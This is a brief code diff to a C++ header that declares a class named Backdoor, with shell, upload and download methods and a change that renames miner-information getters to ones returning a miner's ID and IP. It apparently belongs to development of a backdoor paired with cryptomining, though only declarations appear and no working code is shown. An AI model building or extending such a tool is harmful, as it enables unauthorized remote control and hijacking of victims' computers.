@@ -8,8 +8,8 @@ public:
     void shell();
     void upload(char *);
     void download(char *);
-    std::string get_miner_info();
-    std::string get_info();
+    std::string get_miner_id();
+    std::string get_miner_ip();
 
     Backdoor(char *, int, bool);
 
